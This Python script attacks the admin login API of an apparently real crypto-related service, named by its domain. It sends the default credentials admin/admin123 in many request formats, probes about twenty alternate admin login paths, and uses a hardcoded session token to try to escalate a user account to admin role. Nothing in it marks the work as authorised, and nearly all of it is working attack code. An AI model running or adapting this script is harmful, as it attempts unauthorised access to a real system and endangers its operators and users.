"""
Riscoin Admin Login - Creative approaches
Testing non-standard request structures
"""
import requests, json
import urllib3
urllib3.disable_warnings()

BASE = "https://api.riscoima.com"
H = {
    "Origin": "https://riscoin.com",
    "Referer": "https://riscoin.com/h5/",
    "Content-Type": "application/json",
    "SET-LANGUAGE": "ENGLISH",
    "User-Agent": "Mozilla/5.0"
}

def test(payload, label="", headers_extra=None, raw=False, url=None):
    headers = {**H}
    if headers_extra:
        headers.update(headers_extra)
    target = url or f"{BASE}/api/admin/login"
    try:
        if raw:
            r = requests.post(target, data=payload, headers=headers, timeout=10, verify=False)
        else:
            r = requests.post(target, json=payload, headers=headers, timeout=10, verify=False)
        
        try:
            j = r.json()
            err = j.get("errCode", "?")
            txt = json.dumps(j)[:250]
        except:
            err = f"HTTP{r.status_code}"
            txt = r.text[:250]
        
        if err != 100003:
            print(f"  *** DIFFERENT! [{r.status_code}] errCode={err} | {label}")
            print(f"      {txt}")
        else:
            print(f"  [100003] {label}")
        return r
    except Exception as e:
        print(f"  [ERR] {label}: {e}")

print("=" * 70)
print("TEST 1: Nested JSON structures")
print("=" * 70)

nested = [
    ({"data": {"userName": "admin", "password": "admin123"}}, "nested in data"),
    ({"params": {"userName": "admin", "password": "admin123"}}, "nested in params"),
    ({"body": {"userName": "admin", "password": "admin123"}}, "nested in body"),
    ({"request": {"userName": "admin", "password": "admin123"}}, "nested in request"),
    ({"user": {"name": "admin", "password": "admin123"}}, "nested user.name"),
    ({"login": {"userName": "admin", "password": "admin123"}}, "nested in login"),
    ({"form": {"userName": "admin", "password": "admin123"}}, "nested in form"),
]
for payload, label in nested:
    test(payload, label)

print("\n" + "=" * 70)
print("TEST 2: Array format")
print("=" * 70)

test(["admin", "admin123"], "Array [user, pass]")
test({"list": ["admin", "admin123"]}, "Array in list key")

print("\n" + "=" * 70)
print("TEST 3: Username/password in different locations")
print("=" * 70)

# Try in query params
r = requests.post(f"{BASE}/api/admin/login?userName=admin&password=admin123", 
                  json={}, headers=H, timeout=10, verify=False)
print(f"  Query params: [{r.status_code}] {r.text[:200]}")

# Try in headers
test({}, "In headers", {"X-Admin-User": "admin", "X-Admin-Pass": "admin123"})
test({}, "Auth header", {"Authorization": "Basic YWRtaW46YWRtaW4xMjM="})  # admin:admin123

print("\n" + "=" * 70)
print("TEST 4: Different admin login paths")
print("=" * 70)

alt_paths = [
    "/api/admin/doLogin",
    "/api/admin/signin",
    "/api/admin/signIn",
    "/api/admin/auth",
    "/api/admin/auth/login",
    "/api/admin/user/login",
    "/api/admin/account/login",
    "/api/admin/system/login",
    "/api/admin/sys/login",
    "/api/admin/manager/login",
    "/api/admin/login/submit",
    "/api/admin/login/check",
    "/api/admin/loginByPwd",
    "/api/admin/loginByPassword",
    "/api/system/login",
    "/api/sys/login",
    "/api/manager/login",
    "/api/auth/login",
    "/api/login",
    "/api/user/admin/login",
    "/admin/api/login",
]

for path in alt_paths:
    try:
        r = requests.post(f"{BASE}{path}", json={"userName":"admin","password":"admin123"}, 
                         headers=H, timeout=10, verify=False)
        size = len(r.content)
        try:
            j = r.json()
            err = j.get("errCode", j.get("status", "?"))
            if err not in [100010, 404, 100001]:
                print(f"  *** INTERESTING [{r.status_code}|{size}b] {path}: errCode={err} | {r.text[:150]}")
            else:
                print(f"  [{r.status_code}|{size}b] {path}: errCode={err}")
        except:
            print(f"  [{r.status_code}|{size}b] {path}: {r.text[:100]}")
    except Exception as e:
        print(f"  [ERR] {path}: {e}")

print("\n" + "=" * 70)
print("TEST 5: user login endpoint with admin token injection")
print("=" * 70)

# What if we log in as a user and then try to access admin with our user token?
# But with role manipulation
token = "c6apl6v4ok00_1jn74vunp"
H_auth = {**H, "APP-LOGIN-TOKEN": token}

# Try changing our own user role via user update endpoints
role_inject = [
    ("/api/app/user/verify", {"type": "admin"}, "verify as admin type"),
    ("/api/app/user/verify", {"role": "admin", "level": 99}, "verify with role=admin"),
    ("/api/app/user/get/info", {"type": "admin"}, "get info with type=admin"),
]

for path, payload, label in role_inject:
    try:
        r = requests.post(f"{BASE}{path}", json=payload, headers=H_auth, timeout=10, verify=False)
        j = r.json()
        err = j.get("errCode", "?")
        print(f"  [{r.status_code}] {label}: errCode={err} | {r.text[:200]}")
    except Exception as e:
        print(f"  [ERR] {label}: {e}")

print("\nDone.")
